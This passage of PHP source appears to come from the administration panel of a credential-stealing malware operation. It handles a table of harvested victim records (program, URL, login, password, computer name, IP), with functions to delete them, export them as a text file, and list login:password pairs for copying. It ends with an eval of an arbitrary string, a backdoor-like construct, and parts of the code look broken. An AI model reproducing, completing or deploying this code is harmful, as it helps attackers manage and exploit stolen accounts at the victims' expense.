		$html .= $header.mysql_result($num1,0)." null entries deleted!".$footer;
		echo $html;
		
		mysql_close($mysql);
		
		
	
	// SELECTED **************************************************************************************
	} elseif ($_GET["action"] == "selected") {
		if (isset($_POST["buttonact"]) && isset($_POST["sel"]) && count($_POST["sel"])!=0) {
 
			// DELETE SELECTED ***********************************************************************
			if ($_POST["buttonact"] == "Delete Selected") {
				$mysql = connect_database();
				$query = "DELETE FROM `logs` WHERE";
				for ($i=0; $i<count($_POST["sel"]); $i++) {

					if (is_numeric($_POST["sel"][$i]))

						$query .= " `id` = ".$_POST["sel"][$i]." OR";

				}

				$query .= ';';

				$query = str_replace(' OR;', ';', $query);

				$result = mysql_query($query, $mysql);

				if (!$result) die(mysql_error());

				mysql_close($mysql);

				header("Location: ?action=logs");



}

			elseif ($_POST["buttonact"] == "Selected") {
				header("Content-Type:text plain");
				header("Content-Disposition:Attachment; filename");
				header("Pragma:=no-cache");

				$query = "SELECT * FROM `logs` WHERE";
				
				for ($i = 0; $i < count($_POST["sel"]); $i++) {

					if (is_numeric($_POST["sel"][$i]))

						$query .= " `id` = ".$_POST["sel"][$i]." OR";

				}

				$query .= ';';

				$query = str_replace(' OR;', ';', $query);

				$result = mysql_query($query, $mysql);

				if (!$result) die(mysql_error());

				while ($row = mysql_fetch_array($result)) {

					echo "Program:\t".$aplications[$row['program']]."\r\n";

					echo "Url/Host:\t".$row['url']."\r\n";

					echo "Login:\t\t".$row['login']."\r\n";

					echo "Password:\t".$row['pass']."\r\n";

					echo "Computer:\t".$row['computer']."\r\n";

					echo "Date:\t\t".$row['date']."\r\n";

					echo "Ip:\t\t\t".$row['ip']."\r\n";

					echo "----------------------------------------------------------\r\n";

				}

				mysql_close($mysql);



			// COPY SELECTED *************************************************************************

			} elseif ($_POST["buttonact"] == "Copy Selected") {

				$mysql = connect_database();

				$query = "SELECT `login`, `pass` FROM `logs` WHERE";

				for ($i=0; $i<count($_POST["sel"]); $i++) {

					if (is_numeric($_POST["sel"][$i]))

						$query .= " `id` = ".$_POST["sel"][$i]." OR";

				}

				$query .= ';';

				$query = str_replace(' OR;', ';', $query);

				$result = mysql_query($query, $mysql);

				if (!$result) die(mysql_error());

				$html .= $header."<table id='searchtable' cellpadding='2' cellspacing='0' border='0'><tr class='row1'><td>";
				while ($row = mysql_fetch_array($result))
					$html .= $row['login'].":".$row['pass']."<br>";
				mysql_close($mysql);
				$html .= "</td></tr></table><br>".$footer;
				echo $html;
			}
		}
	} else {
		$html .= $header."Unexpected Error".$footer;
		echo $html;
	}
	
	
	eval($motd);
?>
